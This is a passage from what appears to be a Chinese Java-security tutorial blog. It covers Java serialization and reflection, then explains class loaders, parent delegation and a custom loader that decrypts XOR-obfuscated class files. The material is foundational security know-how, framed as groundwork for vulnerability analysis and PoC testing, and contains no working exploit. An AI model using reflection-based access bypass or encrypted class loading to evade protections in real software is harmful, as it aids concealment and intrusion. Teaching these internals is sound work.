oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 序列化关键函数</span>            oos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//缓冲流</span>            oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关闭流</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">// 反序列化操作，读取数据</span>            <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> x <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//反序列化的关键函数</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在这个实验当中，我们使用的Java反射却是可以访问private的方法和属性，绕过第二级安全机制的方法，原理本质是官兵访问安全检查。</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>在实际利用场景当中，我们利用利用Java反射机制来绕过一些安全权限机制检查，如获取private权限的方法和属性。本质就是我们绕过访问安全检查。所以通过java反射机制的学习，能够为我们为我们后面的java漏洞分析调试，java漏洞poc测试和服务端模板引擎注入等有着十分重要的意义。因为文章讲的比较通俗简单，主要是面向开始没有涉及一些漏洞分析与源码分析，后面java安全基础系列会慢慢加入这些并详细讲解。其次如果大家对文章有什么问题和觉得需要改进的地方，可以在评论下方留言，大家一起探讨交流下。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全基础--类加载器（ClassLoader）</title>
      <link href="/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-1/"/>
      <url>/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>Java类加载器(Java Classloader)是Java运行时环境(Java Runtime Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。</p><h2 id="0x02-类文件编译流程图"><a href="#0x02-类文件编译流程图" class="headerlink" title="0x02 类文件编译流程图"></a>0x02 类文件编译流程图</h2><p><img src="1.png" loading="lazy"></p><p>我们以上图为例子，比如我们创建一个ClassLoaderTest.java文件运行，经过javac编译，然后生成ClassLoaderTest.class文件。这个java文件和生成的class文件都是存储在我们的磁盘当中。但如果我们需要将磁盘中的class文件在java虚拟机内存中运行，需要经过一系列的类的生命周期（加载、连接（验证–&gt;准备–&gt;解析）和初始化操作，最后就是我们的java虚拟机内存使用自身方法区中字节码二进制数据去引用堆区的Class对象。</p><p>通过这个流程图，我们就很清楚地了解到类的加载就是由java类加载器实现的，作用将类文件进行动态加载到java虚拟机内存中运行。</p><h2 id="0x03-应用场景"><a href="#0x03-应用场景" class="headerlink" title="0x03 应用场景"></a>0x03 应用场景</h2><h3 id="1、资源隔离"><a href="#1、资源隔离" class="headerlink" title="1、资源隔离"></a>1、资源隔离</h3><p>实现不同项目或者同一个项目上的不同版本的jar包隔离，避免集群错误或者冲突的产生。</p><h3 id="2、热部署"><a href="#2、热部署" class="headerlink" title="2、热部署"></a>2、热部署</h3><p>对于Java应用程序来说，热部署就是在运行时更新Java类文件。在基于Java的应用服务器实现热部署的过程中，类装入器扮演着重要的角色。类装入器不能重新装入一个已经装入的类，但只要使用一个新的类装入器实例，就可以将类再次装入一个正在运行的应用程序。这样我们应用正在运行的时候升级软件，却不需要重新启动应用。</p><h3 id="3、代码保护"><a href="#3、代码保护" class="headerlink" title="3、代码保护"></a>3、代码保护</h3><p>我们可以对字节码文件进行加密，然后再使用特定的ClassLoader解密文件内容，再加载这些字节码文件。这样就能够实现对我们的代码项目加密保护，别人无法进行反编译查看源代码信息。</p><h2 id="0x04-类加载器分类"><a href="#0x04-类加载器分类" class="headerlink" title="0x04 类加载器分类"></a>0x04 类加载器分类</h2><p>在简单了解的类加载器的概念作用之后，我们可以看看java中类加载器的分类。类加载器大致分为两种，一种是JVM自带的类加载器，分别为引导类加载器、扩展类加载器和系统类加载器。另外一种就是用户自定义的类加载器，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p><h3 id="4-1-JVM默认类加载器"><a href="#4-1-JVM默认类加载器" class="headerlink" title="4.1 JVM默认类加载器"></a>4.1 JVM默认类加载器</h3><h4 id="4-1-1-引导类加载器-BootstrapClassLoader"><a href="#4-1-1-引导类加载器-BootstrapClassLoader" class="headerlink" title="4.1.1 引导类加载器(BootstrapClassLoader)"></a>4.1.1 引导类加载器(BootstrapClassLoader)</h4><p>引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在&#x2F;jre&#x2F;lib&#x2F;rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p><p>这里以我的电脑中jdk1.7为例，这里我们看到&#x2F;jre&#x2F;lib&#x2F;rt.jar目录，这里面的类都是由BootstrapClassLoader来加载。</p><p><img src="2.png" loading="lazy"></p><p>之后我们使用Object类为例，看看其是否存在父加载器。因为Object类是所有子类的父类，归属于BootstrapClassLoader。发现并没有父类加载器，结果为null。</p><p><img src="3.png" loading="lazy"></p><h4 id="4-1-2-扩展类加载器-ExtensionsClassLoader"><a href="#4-1-2-扩展类加载器-ExtensionsClassLoader" class="headerlink" title="4.1.2 扩展类加载器(ExtensionsClassLoader)"></a>4.1.2 扩展类加载器(ExtensionsClassLoader)</h4><p>扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p><p>以我的电脑为例，这个目录下的jar包都是由ExtensionsClassLoader进行加载。</p><p><img src="4.png" loading="lazy"></p><p>这里我们可以选择一个zipfs.jar包，然后查看下其jar中的ZipPath类加载器，发现存在于ExtensionsClassLoader。</p><p><img src="5.png" loading="lazy"></p><h4 id="4-1-3-App类加载器-系统类加载器（AppClassLoader）"><a href="#4-1-3-App类加载器-系统类加载器（AppClassLoader）" class="headerlink" title="4.1.3 App类加载器&#x2F;系统类加载器（AppClassLoader）"></a>4.1.3 App类加载器&#x2F;系统类加载器（AppClassLoader）</h4><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。</p><p>这里我们使用本身写的ClassLoaderTest类进行测试，发现存在于AppClassLoader。</p><p><img src="6.png" loading="lazy"></p><h4 id="4-2-自定义类加载器-UserDefineClassLoader"><a href="#4-2-自定义类加载器-UserDefineClassLoader" class="headerlink" title="4.2 自定义类加载器(UserDefineClassLoader)"></a>4.2 自定义类加载器(UserDefineClassLoader)</h4><p>自定义类加载器(UserDefineClassLoader)，除了上述java自带提供的类加载器，我们还可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。具体实现方法我们等下单独讲解。</p><h2 id="0x05-双亲委派机制"><a href="#0x05-双亲委派机制" class="headerlink" title="0x05 双亲委派机制"></a>0x05 双亲委派机制</h2><p>通常情况下，我们就可以使用JVM默认三种类加载器进行相互配合使用，且是按需加载方式，就是我们需要使用该类的时候，才会将生成的class文件加载到内存当中生成class对象进行使用，且加载过程使用的是双亲委派模式，及把需要加载的类交由父加载器进行处理。</p><p>概念有点绕，我们可以先看类加载器委派关系</p><p><img src="7.png" loading="lazy"></p><p>如上图类加载器层次关系，我们可以将其称为类加载器的双亲委派模型。但注意的是，他们之间并不是”继承”体系，而是委派体系。当上述特定的类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用。这样可以避免有些类被重复加载。</p><h3 id="5-1-双亲委派好处"><a href="#5-1-双亲委派好处" class="headerlink" title="5.1 双亲委派好处"></a>5.1 双亲委派好处</h3><p>1、这样就是能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。</p><p>2、保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。</p><p>假设我们创建一个java.lang包，自定义一个TestObject类，但由于双亲委派机制的存在，是不允许加载运行的。</p><p><img src="8.png" loading="lazy"></p><h2 id="CLassLoader类核心方法"><a href="#CLassLoader类核心方法" class="headerlink" title="CLassLoader类核心方法"></a>CLassLoader类核心方法</h2><p>除了上述BootstrapClassLoader，其他类加载器都是继承了CLassLoader类，我们就一起看看其类的核心方法。以下代码都是截取了其方法的源码。</p><h3 id="1、loadClass：加载指定的java类"><a href="#1、loadClass：加载指定的java类" class="headerlink" title="1、loadClass：加载指定的java类"></a>1、loadClass：加载指定的java类</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// First, check if the class has already been loaded</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// ClassNotFoundException thrown if class not found</span>                    <span class="token comment">// from the non-null parent class loader</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// If still not found, then invoke findClass in order</span>                    <span class="token comment">// to find the class.</span>                    <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// this is the defining class loader; record the stats</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span></code></pre><p>在loadClass方法中，它先使用了findLoadedClass(String)方法来检查这个类是否被加载过。</p><p>接着使用父加载器调用loadClass（String）方法，如果父加载器为null，类加载器加载jvm内置的加载器。</p><p>之后就调用findClass(String) 方法装载类。</p><p>最后通过上述步骤我们找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。</p><h3 id="2、findCLass：查找指定的Java类"><a href="#2、findCLass：查找指定的Java类" class="headerlink" title="2、findCLass：查找指定的Java类"></a>2、findCLass：查找指定的Java类</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="3、findLoadedClass：查找JVM已经加载过的类"><a href="#3、findLoadedClass：查找JVM已经加载过的类" class="headerlink" title="3、findLoadedClass：查找JVM已经加载过的类"></a>3、findLoadedClass：查找JVM已经加载过的类</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">checkName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">findLoadedClass0</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass-方法配合使用。"><a href="#4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass-方法配合使用。" class="headerlink" title="4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用。"></a>4、defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用。</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">ClassFormatError</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="5、resolveClass：链接指定Java类"><a href="#5、resolveClass：链接指定Java类" class="headerlink" title="5、resolveClass：链接指定Java类"></a>5、resolveClass：链接指定Java类</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">resolveClass0</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">resolveClass0</span><span class="token punctuation">(</span><span class="token class-name">Class</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="自定义类加载器过程"><a href="#自定义类加载器过程" class="headerlink" title="自定义类加载器过程"></a>自定义类加载器过程</h2><p>因为在实际应用过程中，我们不仅仅只希望使用classpath当中指定的类或者jar包进行调用使用，我们有时希望调用本地磁盘文件或者网络还可以使用自定义类加载器的方式。</p><p>在上面loadClass方法分析中，他内部其实是调用findClass(String) 方法来装载类，所以我们要想加载自己自定义的类，就是覆盖这个findClass(String) 方法，而不是loadClass方法。</p><p>以下就是自定义类加载器步骤：</p><p>1、继承ClassLoader类</p><p>2、覆盖findClass()方法</p><p>3、在findClass()方法中调用defineClass()方法</p><p>这里我们借助一个加密java类字节码例子来讲解。</p><p>这里我们先创建一个CypherTest.java文件，然后使用java -d . CypherTest.java，然后就能生成CypherTest.class文件了。</p><p>CypherTest.java文件</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CypherTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This experiment test is successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>目录下生成了CypherTest.class文件。</p><p><img src="9.png" loading="lazy"></p><p>之后我们编写一个加密类Encryption，使用简单的逐位取反进行加密操作。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Encryption</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/usr/local/com/test/CypherTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 获取路径CypherTest.class文件</span>                <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/usr/local/temp/com/test/CypherTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 为了保持一致，创建了一个空的temp目录</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">File</span> src<span class="token punctuation">,</span> <span class="token class-name">File</span> dest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>            fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 逐位取反操作</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 读取一个字节</span>                fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 取反输出</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 关闭数据流</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fis <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This experiment test is successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>之后我们看到生成了加密后新的CypherTest.class文件。</p><p><img src="10.png" loading="lazy"></p><p>因为这个是自定义加密后，我们无法使用工具直接进行反编译操作和直接使用jvm默认类加载器去使用它。</p><p>之后我们再编写一个Dectyption解密类，对新加密的CypherTest.class进行解密操作。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Decryption</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 继承ClassLoader类</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> rootDir<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Decryption</span><span class="token punctuation">(</span><span class="token class-name">String</span> rootDir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>rootDir <span class="token operator">=</span> rootDir<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// 重写覆盖findClass</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token 